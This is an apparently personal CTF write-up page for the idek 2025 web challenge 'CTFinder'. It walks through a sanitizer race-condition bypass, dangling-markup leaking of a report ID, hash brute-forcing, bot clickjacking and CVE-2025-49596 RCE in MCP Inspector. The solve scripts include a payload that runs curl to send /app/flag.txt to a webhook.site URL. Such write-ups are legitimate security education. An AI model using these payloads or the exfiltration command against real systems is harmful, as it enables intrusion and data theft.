<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>idek 2025 - CTFinder</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-bec233ca.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-ce236130.css">
  <meta property="article:tag" content="idek 2025"><meta property="article:tag" content="web"><meta name="description" content="Looking at the provided challenge source, there are 4 services: 

```yaml:docker-compose.yml
version: &quot;3.8&quot;

services:
  main:
    build: ./web
    ports:
      - &quot;1337:1337&quot;
...

  redis:
    image: redis:7-alpine
...

  bot:
    build: ./bot
...

  mcp-server:
    build: ./mcp-server
...
```

All these services are on the same network, however only `main` is exposed on port 1337. 

![](/ctf-writeups/idek25/ctfinder-preview.png)

# RCE on mcp-server

The codebase is pretty large, so I decided to work backwards. The flag is in `/app/flag.txt` on mcp-server. It is not referenced anywhere else in the code, leading me to believe we either need LFI or RCE on this container.

I began by checking for package vulnerabilities with snyk (I do this everytime there's a challenge with external packages, to get known CVEs out of the way):

```plaintext
$ python -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt
$ snyk test --file=requirements.txt
```

This yielded no results, so I continued on to server.py. As expected, it's a FastAPI MCP server that provides tools to scrape ctftime.org. But to make a long story short, I did not find any vulnerabilities that could lead to RCE. This was until I took a closer look at the Dockerfile, and found a (somewhat) sneakily hidden command on the last line:

```Dockerfile
...
CMD [&quot;bash&quot;, &quot;-c&quot;, &quot;echo 'Starting MCP Inspector for debugging...' &amp;&amp; export npm_config_cache=/tmp/.npm-cache &amp;&amp; mkdir -p /tmp/.npm-cache &amp;&amp; npx @modelcontextprotocol/inspector@0.13.0 python server.py&quot;]
```

`@modelcontextprotocol/inspector` introduces itself as &quot; a developer tool for testing and debugging MCP servers&quot;. More importantly, it has a known RCE vulnerability for versions `<0.14.1`: [CVE-2025-49596](https://nvd.nist.gov/vuln/detail/CVE-2025-49596). I looked through this [blog post](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596) to get an idea of how it works, but the important part was just this url:

```plaintext
http://0.0.0.0:6277/sse?transportType=stdio&amp;command=touch&amp;args=%2Ftmp%2Fexploited-from-the-browser
```

The exploit is pretty self explanatory, we just need the server to send a GET request to this endpoint, specifying the desired `command` and `args` parameters.

# Finding the XSS source

With the endpoint in mind, I went back to the `web` folder. The `bot` container sounds like the perfect candidate to achieve such SSRF, so I looked for a way to access it from the public web interface. My search led me to the /report endpoint:

```python:web/sessions/routes.py
@session_bp.route('/<session_id>/report', methods=['GET'])
@login_required
@token_required
def get_report(session_id):
    user_id = flask_session['user_id']

    redis = get_redis()
    report = redis.get(f&quot;session:{session_id}:{user_id}:report&quot;)

    if not report:
        return jsonify({'error': 'No report found'}), 404

    url = f&quot;http://bot:5010/?session_id={session_id}&amp;user_id={user_id}&quot;
    res = requests.get(url)

    if res.json().get('message') != &quot;Bot visited the URL&quot;:
        return jsonify({'error': 'Failed to get report'}), 400
    
    redis.delete(f&quot;session:{session_id}:{user_id}:report&quot;)

    return jsonify({'message': 'Report sent'}), 200
```

However, before making any request, we need the `session:{session_id}:{user_id}:report` key to be set in redis. It's set in only one place: `stream_claude_response`:

```python:web/sessions/stream.py
def stream_claude_response(app, session_id, user_id, content, parent_message_id, stream_channel):
    with app.app_context():
        ...

        response = requests.post(
            &quot;https://api.anthropic.com/v1/messages&quot;,
            headers=headers,
            json=request_body,
            stream=True
        )
        
        if not response.ok:
            ...
            
            redis.set(f&quot;session:{session_id}:{user_id}:report&quot;, json.dumps({
                &quot;event&quot;: &quot;error&quot;,
                &quot;meta&quot;: json.loads(redis.get(stream_channel.replace('stream', 'meta'))),
                &quot;message_id&quot;: assistant_message_id,
                &quot;message&quot;: error_message
            }))

...
```

The function calls the claude API to get the LLM's response, and creates the report key in event of an error. It is referenced in only one location: 

```python:web/sessions/routes.py
@session_bp.route('/<session_id>/messages', methods=['POST'])
@login_required
@token_required
def create_message(session_id):
    ...

    # this sanitizer part will be discussed later
    sanitizer = Sanitizer(content)  # content = request.get_json().get('content')

    if sanitizer.check(session_id, user_id):
        content = sanitizer.sanitize()
    
    ...

    thread = threading.Thread(
        target=stream_claude_response,
        args=(current_app._get_current_object(), session_id, user_id, content, message_id, stream_channel)
    )

    thread.daemon = True
    thread.start()

...
```

So we need to create a message that triggers a claude API error. Luckily, this is quite easy to do by simply providing an invalid API key. (Recall that the challenge description stated you don't need a valid claude API key.) Thereafter, we can report the session and trigger the bot.

Note that in the code above, there is also some sanitization done, the first of a few hurdles we will have to overcome to obtain XSS.

Once triggered, the bot will visit the `/session/{session_id}` endpoint:

```javascript:bot/bot.js
app.get('/', async (req, res) => {
  const session_id = req.query.session_id;
  const user_id = req.query.user_id;

  console.log(`session_id = &quot;${session_id}&quot;`);
  console.log(`user_id = &quot;${user_id}&quot;`);

  if (!session_id || !user_id) {
    return res.status(400).json({ error: 'session_id and user_id are required' });
  }

  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
  const url = `http://main:1337/sessions/${session_id}?user_id=${user_id}&amp;report_id=${report_id}`;

  await visit(url, report_id);

  res.json({ message: 'Bot visited the URL' });
});
```

In the visit function, we see a second hurdle:

```javascript:bot/bot.js
const visit = async (url, report_id) => {
    // ... setting up the browser and signing in ...
    // ... navigating to the url ...

    await page.evaluate(() => {
      document.querySelectorAll('meta[http-equiv]').forEach((el) => {
        if (el.getAttribute('http-equiv').toLowerCase() === 'refresh') {
          el.remove();
        }
      });
      window.stop();
    });

    await page.waitForTimeout(2000);

    await page.evaluate((report_id) => {
      document.querySelector(`#checkReportBtn-${report_id}`).click();
    }, report_id);

    // ... logging out and tearing down ...
}
```

The first part thwarts a well-known technique of using meta tags to navigate to another page: `<meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://attacker.site&quot; />`. The second part looks more useful, and could be a clickjacking sink (it is in fact used later on).

Based on the sanitization checks in `create_message`, I assumed that our XSS source would be in the message content. To verify this, I restarted the container with sanitization disabled and verified that I was able to use that to inject arbitrary elements into the DOM.

> The content is dynamically loaded on the client side using innerHTML. You can read the code in `web/templates/session.html` to see exactly where this happens, but it's not very interesting so I'm leaving it out.

# Overcoming Sanitizer

Let's have a look at the first obstacle: `Sanitizer`

```python:web/sessions/sanitizer.py
import time
import bleach
import hashlib

sanitize_store = {}

class Sanitizer:
    def __init__(self, content: str):
        self.content = content

    def generate_key(self, session_id, user_id):
        global sanitize_store
        nonce = self.content[:128]
        timestamp = int(time.time())
        key = f&quot;{session_id}:{user_id}:{nonce}:{timestamp}&quot;
        hash = hashlib.sha256(key.encode()).hexdigest()

        return hash
    
    def check(self, session_id, user_id):
        global sanitize_store
        
        hash = self.generate_key(session_id, user_id)
        
        if hash in sanitize_store:
            return sanitize_store[hash]
    
        bad_chars = ['<', '>', '=', '!', '@', '#', '$', '%', '^', '&amp;', '*', '(', ')', '[', ']', '{', '}', '|', '\\', '/', '?', ':', ';', '.', ',', '\'', '\&quot;', '`', '~']

        for char in bad_chars:
            if char in self.content:
                sanitize_store[hash] = True
                return True
        
        sanitize_store[hash] = False
        return False
    
    def sanitize(self):
        allowed_tags = ['p', 'strong', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'code']
        allowed_attrs = {
            '*': ['class']
        }

        return bleach.clean(self.content, tags=allowed_tags, attributes=allowed_attrs)
```

Recall that sanitizer is used as follows:

```python
sanitizer = Sanitizer(content)

if sanitizer.check(session_id, user_id):
    content = sanitizer.sanitize()
```

From a first glance, `bad_chars` is an extremely strict blacklist and seemingly impossible to bypass. We could try to find a vulnerability in `bleach.clean`, however there is the glaringly suspicious `satinize_store`, which acts as a cache of sorts for `sanitizer.check` results.

Looking at `generate_key`, we can see that cache keys only check the first 128 characters of the payload, and the current time in seconds. Thus, if we first send a message with 128 characters that passes the check, it will be recorded as &quot;clean&quot;. If we then send another message in the same second, with the same first 128 characters, we can append our XSS payload to the back, and it will still pass the sanitizer check due to the key collision.

I wrote a python script for this:

```python:s.py
import requests
import random
import time
from threading import Thread

url = 'http://127.0.0.1:1337'

sess = requests.Session()

# sess.post(url + '/auth/register', json={'username': 'a', 'password': 'a'})
sess.post(url + '/auth/login', json={'username': 'a', 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

payload = '<script>alert(1)</script>'

def send_message(sess: requests.Session, sid: str, content: str):
    resp = sess.post(url + f'/sessions/{sid}/messages', json={'content': content})
    print(resp.text)

a = Thread(target=send_message, args=(sess, sid, 'A' * 128))
b = Thread(target=send_message, args=(sess, sid, 'A' * 128 + payload))

a.start()
time.sleep(0.1)
b.start()

a.join()
b.join()
```

Running this and inspecting the resulting session in the browser, I confirmed the script tag was successfully inserted into the DOM. However, it doesn't run due to CSP.

# CSP &amp; clickjacking

The app has a rather strict CSP:

```python:web/app.py
@app.after_request
def add_security_headers(response):
    nonce = getattr(g, 'csp_nonce', '')
    csp_policy = (
        &quot;default-src 'self'; &quot;
        f&quot;script-src 'self' 'nonce-{nonce}' https://cdn.tailwindcss.com; &quot;
        &quot;style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; &quot;
        &quot;font-src 'self' https://cdnjs.cloudflare.com; &quot;
        &quot;img-src 'self'; &quot;
        &quot;connect-src 'self'; &quot;
        &quot;media-src 'self'; &quot;
        &quot;worker-src 'self'; &quot;
        &quot;child-src 'none'; &quot;
        &quot;frame-src 'none'; &quot;
        &quot;object-src 'none'; &quot;
        &quot;base-uri 'self'; &quot;
        &quot;form-action 'self'; &quot;
        &quot;frame-ancestors 'none'; &quot;
    )

    response.headers['Content-Security-Policy'] = csp_policy
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
```

Almost all standard techniques are blocked - iframes, object tags, embed tags, base tags. However, `style-src 'unsafe-inline'` looked interesting.

Remembering that the bot does a single click (`document.querySelector(``#checkReportBtn-${report_id}``).click();`), I realised if we inject a link with the same element id, the bot would click our link instead (since it appears before the real button in the DOM), redirecting to wherever we desire. The problem is that `report_id` is unknown, generated as follows (`REPORT_KEY` is an unknown environment variable):

```javascript
  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
```

But notice that `report_id` stays consistent for the same session. If we are able to somehow leak the value, we can create a new report in the same session, with the correct element id and thus redirect the bot.

I experimented with ideas to do [blind CSS exfiltration](https://portswigger.net/research/blind-css-exfiltration). `default-src 'self'` blocks almost all cross-origin network connections without javascript, but it doesn't block DNS prefetching. With this in mind I tried exfiltrating with `<link rel=&quot;dns-prefetch&quot; href=&quot;http://attacker.site&quot;>` and [interactsh](https://github.com/projectdiscovery/interactsh), but it didn't work because DNS prefetching is done immediately after the tag is parsed, way before any styles are applied.

I also scoured the app's API routes for possible exfiltration points, but none of them worked.

# Admin routes

Finally, I took a look into `session.html`. It's a big file at 960 lines, and I was hoping there would be something useful inside.

```html
<script nonce=&quot;{{ g.csp_nonce }}&quot;>
    // ... initialising variables ...

    document.addEventListener('DOMContentLoaded', async function() {
        await checkAuth();
        loadInitialData(); // insert message content into the DOM
        setupEventListeners();
        setupLazyLoading();
        
        if (INITIAL_USER_DATA &amp;&amp; INITIAL_USER_DATA.is_admin) {
            await saveReportLog();
        }
    });
```

Starting from the main script initialization, I looked through all the functions. Most of them were unremarkable, but `saveReportLog` was different.

```javascript
async function saveReportLog() {
    const allMessages = messagesContainer.querySelectorAll('.message.user, .message-pair');
    let userMessage = null;
    
    for (let i = allMessages.length - 1; i >= 0; i--) {
        const messageElement = allMessages[i];
        
        if (messageElement.classList.contains('user')) {
            const proseContent = messageElement.querySelector('.prose');
            if (proseContent) {
                userMessage = proseContent.innerHTML.trim();
                break;
            }
        }
        
        if (messageElement.classList.contains('message-pair')) {
            const userDiv = messageElement.querySelector('.justify-end .prose');
            if (userDiv) {
                userMessage = userDiv.innerHTML.trim();
                break;
            }
        }
    }

    if (!userMessage) {
        console.warn('No user message found to save report log');
        return;
    }

    userMessage = userMessage
        .replace(/\n/g, '')
        .replace(/\r/g, '')
        .replace(/\t/g, '')
        .replace(/</g, '&amp;lt;')
        .replace(/>/g, '&amp;gt;');

    try {
        const response = await fetch(`/admin/sessions/${currentSessionId}/report`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'same-origin',
            body: JSON.stringify({
                report_message: userMessage,
                reporter_id: INITIAL_USER_DATA.user_id
            })
        });
        
        if (response.ok) {
            console.log('Report log saved');
        } else {
            console.warn('Report log save failed:', response.status);
        }
    } catch (error) {
        console.error('Admin check error:', error);
    }
}
```

Essentially, it selects an element based on its classes, and posts the contents to `/admin/sessions/${currentSessionId}/report`.

Until now, the `/admins` routes of the app have never been used. It has only two endpoints, one to post reports, and one to get reports. Conveniently, the GET endpoint does not require admin!

```python:web/admins/routes.py
@admin_bp.route('/sessions/<session_id>/report', methods=['GET'])
@login_required
def get_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    db = get_db()
    report_logs = db.execute('SELECT * FROM report_logs WHERE session_id = ?', (session_id,)).fetchall()

    if not report_logs:
        return jsonify({'error': 'No report logs found'}), 404

    report_logs_json = []

    for report_log in report_logs:
        if report_log['user_id'] == user_id or is_admin:
            report_logs_json.append({
                'id': report_log['id'],
                'user_id': report_log['user_id'],
                'session_id': report_log['session_id'],
                'message_id': report_log['message_id'],
                'report_message': report_log['report_message'] if is_admin else &quot;Cannot view report message&quot;
            })

    return jsonify({'report_logs': report_logs_json}), 200

@admin_bp.route('/sessions/<session_id>/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    if not is_admin:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()

    report_message = data.get('report_message')
    reporter_id = data.get('reporter_id')

    if not report_message or not reporter_id:
        return jsonify({'error': 'report_message and reporter_id are required'}), 400

    report_message = report_message.replace('\n', '').replace('\r', '').replace('\t', '').replace('<', '&amp;lt;').replace('>', '&amp;gt;')
    message_id = hashlib.sha256(report_message.encode()).hexdigest()

    db = get_db()
    existing_report = db.execute('SELECT id FROM report_logs WHERE report_message = ? AND user_id = ?', (message_id, reporter_id)).fetchone()

    if existing_report:
        return jsonify({'error': 'Report already exists'}), 400
    
    db.execute('INSERT INTO report_logs (id, user_id, admin_id, session_id, message_id, report_message) VALUES (?, ?, ?, ?, ?, ?)', (str(uuid.uuid4()), reporter_id, user_id, session_id, message_id, report_message))
    db.commit()

    return jsonify({'message': 'Report saved'}), 200
```

If we could somehow include our `report_id` inside the admin report, then perhaps it could be exfiltrated. But how do we encapsulate the report button in an element we control?

# Exfiltrating report_id

A `<style>` tag achieves exactly that. When the html parser encounters a `<style>` tag, it consumes all characters until it encounters the closing tag `</style>`. Thus, all other closing tags are ignored and it is able to gobble up large parts of the DOM. I thereby came up with the payload:

```html
<div class=&quot;message user&quot;><div class=&quot;prose&quot;><style>
```

The dangling markup is automatically closed by the `innerHTML` setter, at the end of `.message-pair`.

```javascript:web/templates/session.html
function createMessagePairElement(pair) {
    const pairElement = document.createElement('div');
    pairElement.className = 'message-pair space-y-4';
    
    let pairHTML = '';
    
    if (pair.user) {
        // our injection point
        pairHTML += createSingleMessageHTML(pair.user.role, pair.user.content);
    }
    
    if (pair.assistant) {
        // this part contains report_id
        pairHTML += createSingleMessageHTML(pair.assistant.role, pair.assistant.content);
    }
    
    pairElement.innerHTML = pairHTML;
    return pairElement;
}
```

The resulting DOM looks like this (signed in as a user):

```html
<div class=&quot;message user&quot;><div class=&quot;prose&quot;><style>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            
                <div class=&quot;flex justify-start&quot;>
                    <div class=&quot;flex max-w-[80%] flex-row items-start space-x-3&quot;>
                        <div class=&quot;w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3&quot;>
                            <i class=&quot;fas fa-robot text-white text-sm&quot;></i>
                        </div>
                        <div class=&quot;flex-1&quot;>
                            <div class=&quot;bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3&quot;>
                                <div class=&quot;prose prose-sm max-w-none text-gray-800&quot;>
                                    <div class=&quot;text-red-500&quot;>
                                            <p>
                                                <strong>An error occurred.</strong>
                                                <br>
                                                Claude API Error: HTTP 401 - invalid x-api-key
                                            </p>
                                            <br>
                                            
                                            <button id=&quot;reportBtn&quot; class=&quot;bg-red-500 text-white px-4 py-2 rounded-md&quot;>
                                                Report Session
                                            </button>
                                            
                                            <br><br>
                                            <p class=&quot;text-sm&quot;>
                                                <strong>'You cannot send new messages until you report.'</strong>
                                            </p>
                                            </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </style></div></div>
```

I reported this session and checked `/admin/sessions/{session_id}/report`:

```json
{
    &quot;report_logs&quot;: [
        {
            &quot;id&quot;: &quot;ee461e60-9b19-4f84-907e-55a9721d5915&quot;,
            &quot;message_id&quot;: &quot;fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942&quot;,
            &quot;report_message&quot;: &quot;Cannot view report message&quot;,
            &quot;session_id&quot;: &quot;23d902f7-b3ac-41e4-b3d4-63088b7b535b&quot;,
            &quot;user_id&quot;: &quot;654a6a03-6764-4e77-8f28-2921ac275bb6&quot;
        }
    ]
}
```

Here's one last hurdle: the report content is censored from non-admins. But take another look at how `message_id` is generated during admin report creation:

```python:web/admins/routes.py

@admin_bp.route('/sessions/<session_id>/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    ...
    message_id = hashlib.sha256(report_message.encode()).hexdigest()
    ...
```

`message_id` is the sha256 digest of the message contents. Since `report_id` is the only part that changes in the message, we can brute force those 3.5 bytes until we find the matching hash. I wrote a python script to do this (takes around 12 minutes to run in the worst case):

```python:b.py
import hashlib

for i in range(16 ** 7):
    rid = hex(i)[2:].rjust(7, '0')
    s = f&quot;&amp;lt;style&amp;gt;                                &amp;lt;/div&amp;gt;                            &amp;lt;/div&amp;gt;                        &amp;lt;/div&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;/div&amp;gt;                            &amp;lt;div class=\&quot;flex justify-start\&quot;&amp;gt;                    &amp;lt;div class=\&quot;flex max-w-[80%] flex-row items-start space-x-3\&quot;&amp;gt;                        &amp;lt;div class=\&quot;w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3\&quot;&amp;gt;                            &amp;lt;i class=\&quot;fas fa-robot text-white text-sm\&quot;&amp;gt;&amp;lt;/i&amp;gt;                        &amp;lt;/div&amp;gt;                        &amp;lt;div class=\&quot;flex-1\&quot;&amp;gt;                            &amp;lt;div class=\&quot;bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3\&quot;&amp;gt;                                &amp;lt;div class=\&quot;prose prose-sm max-w-none text-gray-800\&quot;&amp;gt;                                    &amp;lt;div class=\&quot;text-red-500\&quot;&amp;gt;                                            &amp;lt;p&amp;gt;                                                &amp;lt;strong&amp;gt;An error occurred.&amp;lt;/strong&amp;gt;                                                &amp;lt;br&amp;gt;                                                Claude API Error: HTTP 401 - invalid x-api-key                                            &amp;lt;/p&amp;gt;                                            &amp;lt;br&amp;gt;                                                                                        &amp;lt;button id=\&quot;checkReportBtn-{rid}\&quot; class=\&quot;bg-red-500 text-white px-4 py-2 rounded-md\&quot;&amp;gt;                                                Check Report {rid}                                            &amp;lt;/button&amp;gt;                                            &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;                                            &amp;lt;p class=\&quot;text-sm\&quot;&amp;gt;                                                &amp;lt;strong&amp;gt;'You cannot send new messages until you report.'&amp;lt;/strong&amp;gt;                                            &amp;lt;/p&amp;gt;                                            &amp;lt;/div&amp;gt;                                &amp;lt;/div&amp;gt;                            &amp;lt;/div&amp;gt;                        &amp;lt;/div&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;/div&amp;gt;            &amp;lt;/style&amp;gt;&quot;
    if i % 1_000_000 == 0:
        print(i, round(i * 100 / (16 ** 7), 2))
    if hashlib.sha256(s.encode()).hexdigest() == 'fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942':
        print(rid)
        break
```

```plaintext:output
...
34b3da7
```

With that, we've managed to leak report_id. Create a second message in the same session with a link to the RCE endpoint, with the desired command:

```html
<a id=&quot;checkReportBtn-34b3da7&quot; href=&quot;http://mcp-server:6277/sse?transportType=stdio&amp;command=sh&amp;args=-c%20%22curl%20https%3A//webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa%3Ff%3D%60cat%20/app/flag.txt%20%7C%20base64%20-w%200%60%22&quot; />
```

Thereafter, I got the flag locally.

# Solve script

On remote, threading+requests wasn't winning the race condition to bypass `Sanitizer` (I don't know why) but I got it working with `grequests`. Since it only worked half the time, I split my solve into two scripts. After running the first script I would manually check if the payload was successfully inserted, and once it worked I send the report. Then I copied the `message_id` and ran my hash cracker (I should probably have preemptively generated a mapping of all possible hashes beforehand, since I had to retry my exploit multiple times and this part took quite long to run). Once I got the correct `report_id`, I copied it over to the second script which inserts the malicious link.

```python:s0.py
import grequests
import requests
import time
import random

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'a'

sess = requests.Session()

sess.post(url + '/auth/register', json={'username': username, 'password': 'a'})
sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

# exfiltrate report id with css
payload = '<div class=&quot;message user&quot;><div class=&quot;prose&quot;><style>'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
```

```python:s1.py
import grequests
import requests
from urllib.parse import quote

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'z'
sid = 'edc5a1e1-9463-4444-a138-a53c98cba650'
report_id = 'fe0a001'

sess = requests.Session()

sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

args = '-c &quot;curl https://webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa?f=`cat /app/flag.txt | base64 -w 0`&quot;'
args = quote(args)
print(args)

payload = f'<a id=&quot;checkReportBtn-{report_id}&quot; href=&quot;http://0.0.0.0:6277/sse?transportType=stdio&amp;command=sh&amp;args={args}&quot; />'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
```

A few seconds after reporting the second message, I got the webhook notification and decoded the flag:

`idek{78a750a47c1a4350a0f528b63293dc05f3c9afcee09bbb0f85b5b2d13b537b95}`

# Closing thoughts

I was quite happy with this solve. This challenge consisted of many smaller parts which in isolation aren't that hard, but with a  large codebase its easy to get lost or stuck down a rabbit hole. I found it helpful to follow the signposts (e.g. button click in the bot, existence of admin routes) whenever I was stumped."><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a aria-current="page" href="/ctf-writeups/ctfinder" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">CTFinder</span></a><a href="/ctf-writeups/jnotes" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" 